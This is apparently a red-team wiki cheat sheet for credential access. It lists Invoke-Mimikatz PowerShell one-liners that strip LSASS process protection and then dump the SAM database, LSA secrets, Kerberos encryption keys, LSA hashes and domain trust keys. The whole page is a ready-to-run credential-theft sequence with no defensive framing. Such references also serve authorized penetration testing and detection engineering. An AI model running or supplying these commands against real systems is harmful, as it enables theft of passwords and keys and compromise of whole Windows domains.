---
metaLinks:
  alternates:
    - >-
      https://app.gitbook.com/s/qDX4NWkPelZggTpGCfyF/offensive-treasure/red-team/credential-access/os-credential-dumping/invoke-mimikatz
---

# Invoke-Mimikatz

```powershell
# Disable LSASS PPL protection
Invoke-Mimikatz -Command "`"!processprotect /process:lsass.exe /remove`""

# SAM
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "lsadump::sam"'

# secrets
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "lsadump::secrets"'

# ekeys
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::ekeys"'

# LSA
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "lsadump::lsa /patch"'

# Trust
Invoke-Mimikatz -Command '"lsadump::trust /patch"'
```
